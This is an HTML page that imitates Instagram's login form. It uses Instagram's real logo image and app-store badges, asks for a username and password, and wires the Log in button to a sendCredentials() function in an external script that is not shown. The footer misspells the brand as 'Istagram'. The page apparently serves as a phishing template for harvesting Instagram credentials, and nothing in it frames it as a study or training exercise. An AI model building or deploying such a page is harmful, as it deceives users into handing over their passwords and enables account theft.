<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Instagram login Form</title>
    <link rel="stylesheet" href="instagram.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
    <script src="script.js"></script>
</head>

<body>
    <div id="wrapper">
        <div class="container">
            <div class="phone-app-demo"></div>
            <div class="form-data">
                <form action="">
                    <div class="logo">
                        <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img"
                            style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yx/r/WtxJZZ3-9ZP.png&quot;); background-position: 0px 0px; background-size: 176px 186px; width: 174px; height: 50px; background-repeat: no-repeat; display: inline-block;"></i>
                    </div>
                    <input id="usernameInput" type="text" placeholder="Phone number, username, or email">
                    <input id="passwordInput" type="password" placeholder="Password">
                    <button class="form-btn" onclick="sendCredentials()">Log in</button>
                    <span class="has-separator">Or</span>
                    <a href="#" class="facebook-login">
                        <i class="fab fa-facebook"></i> Log in with Facebook
                    </a>
                    <a class="password-reset" href="#">Forgot password?</a>
                </form>
                <div class="sign-up">
                    Don't an account? <a href="#">Sign up</a>
                </div>
                <div class="get-the-app">
                    <span>Get the app</span>
                    <div class="badge">
                        <a
                            href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D94413CAD-774C-4185-B0E5-22E81FFA6A8E%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge">
                            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
                                alt="android App">
                        </a>
                        <a
                            href="ms-windows-store://pdp/?productid=9nblggh5l9xt&amp;referrer=appbadge&amp;source=www.instagram.com&amp;mode=mini&amp;pos=0%2C0%2C1920%2C1020">
                            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
                                alt="ios app">
                        </a>

                    </div>
                </div>
            </div>
        </div>

        <footer>
            <div class="container">
                <nav class="footer-nav">
                    <ul>
                        <li><a href="#">About Us</a></li>
                        <li><a href="#">Support</a></li>
                        <li><a href="#">Jobs</a></li>
                        <li><a href="#">Privacy</a></li>
                        <li><a href="#">Terms</a></li>
                        <li><a href="#">Profiles</a></li>
                        <li><a href="#">Languages</a></li>
                    </ul>
                </nav>
                <div class="copyright-notice">
                    &copy; 2023 Istagram
                </div>
            </div>
        </footer>
    </div>
</body>

</html>
